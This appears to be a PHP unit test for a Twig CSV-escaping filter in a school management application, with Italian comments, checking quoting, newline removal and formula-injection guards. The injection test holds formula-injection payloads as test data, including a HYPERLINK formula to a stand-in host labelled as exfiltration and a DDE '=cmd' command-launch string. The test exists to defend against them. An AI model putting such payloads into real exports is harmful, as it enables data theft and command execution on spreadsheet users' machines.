<?php
/*
 * SPDX-FileCopyrightText: 2017 I.I.S. Michele Giua - Cagliari - Assemini
 *
 * SPDX-License-Identifier: AGPL-3.0-or-later
 */


namespace App\Tests\UnitTest\Twig;

use App\Twig\CsvExtension;
use Symfony\Bundle\FrameworkBundle\Test\KernelTestCase;
use Twig\TwigFilter;


/**
 * Unit test dell'estensione Twig: csv
 *
 * @author Antonello Dessì
 */
class CsvExtensionTest extends KernelTestCase {


  //==================== METODI DELLA CLASSE ====================

  /**
   * Predispone i servizi per l'ambiente di test
   *
   */
  protected function setUp(): void {
    // esegue il setup standard
    parent::setUp();
  }

  /**
   * Chiude l'ambiente di test e termina i servizi
   *
   */
  protected function tearDown(): void {
    // chiude l'ambiente di test standard
    parent::tearDown();
  }

  /**
   * Test funzione: getFilters
   *
   */
  public function testGetFilters(): void {
    // init
    $ext = new CsvExtension();
    // filtro restituito
    $res = $ext->getFilters();
    $filter = new TwigFilter('csv', [$ext, 'csvEscape'], ['is_safe' => ['html']]);
    $this->assertCount(1, $res);
    $this->assertEquals($filter, $res[0]);
  }

  /**
   * Test funzione: csvEscape, valori semplici
   *
   * Il quoting e' sempre applicato, anche quando non servirebbe.
   *
   */
  public function testCsvEscapeValoriSemplici(): void {
    // init
    $ext = new CsvExtension();
    // valore testuale
    $this->assertEquals('"Cagliari"', $ext->csvEscape('Cagliari'));
    // valore vuoto
    $this->assertEquals('""', $ext->csvEscape(''));
    // valore nullo
    $this->assertEquals('""', $ext->csvEscape(null));
    // valore numerico
    $this->assertEquals('"42"', $ext->csvEscape(42));
    // accenti e caratteri UTF-8
    $this->assertEquals('"Città di Cagliari"', $ext->csvEscape('Città di Cagliari'));
  }

  /**
   * Test funzione: csvEscape, quoting delle virgolette
   *
   * Le virgolette doppie interne vanno raddoppiate secondo RFC 4180.
   *
   */
  public function testCsvEscapeQuoting(): void {
    // init
    $ext = new CsvExtension();
    // virgolette interne
    $this->assertEquals('"Mario ""Rossi"""', $ext->csvEscape('Mario "Rossi"'));
    // apici singoli: non vengono alterati
    $this->assertEquals('"O\'Brien"', $ext->csvEscape('O\'Brien'));
  }

  /**
   * Test funzione: csvEscape, rimozione dei carriage return e line feed
   *
   * Un valore multilinea spezzerebbe la riga CSV in righe non previste.
   *
   */
  public function testCsvEscapeNewline(): void {
    // init
    $ext = new CsvExtension();
    // line feed
    $this->assertEquals('"riga 1 riga 2"', $ext->csvEscape("riga 1\nriga 2"));
    // carriage return
    $this->assertEquals('"riga 1 riga 2"', $ext->csvEscape("riga 1\rriga 2"));
    // entrambi
    $this->assertEquals('"a b c"', $ext->csvEscape("a\nb\rc"));
  }

  /**
   * Test funzione: csvEscape, guardia contro la CSV injection
   *
   * I fogli di calcolo interpretano come formula i valori che iniziano con
   * '=', '+', '-', '@', TAB o CR: devono essere neutralizzati con un apice.
   *
   */
  public function testCsvEscapeIniezione(): void {
    // init
    $ext = new CsvExtension();
    // formula con 'HYPERLINK' (esfiltazione dati)
    $this->assertEquals('"\'=1+1"', $ext->csvEscape('=1+1'));
    $this->assertEquals('"\'=HYPERLINK(""http://evil.test"",""clic"")"',
      $ext->csvEscape('=HYPERLINK("http://evil.test","clic")'));
    $this->assertEquals('"\'=cmd|\' /C calc\'!A0"', $ext->csvEscape('=cmd|\' /C calc\'!A0'));
    // altri prefissi pericolosi
    $this->assertEquals('"\'+1234"', $ext->csvEscape('+1234'));
    $this->assertEquals('"\'-1234"', $ext->csvEscape('-1234'));
    $this->assertEquals('"\'@SUM(1+1)"', $ext->csvEscape('@SUM(1+1)'));
    $this->assertEquals("\"'\tvalore\"", $ext->csvEscape("\tvalore"));
    // il CR viene neutralizzato due volte: apice iniziale, poi spazio
    $this->assertEquals('"\' valore"', $ext->csvEscape("\rvalore"));
    // NON deve neutralizzare: sono solo dati
    $this->assertEquals('"Mario Rossi"', $ext->csvEscape('Mario Rossi'));
    $this->assertEquals('"a=b"', $ext->csvEscape('a=b'));
    $this->assertEquals('"5-3"', $ext->csvEscape('5-3'));
  }

}
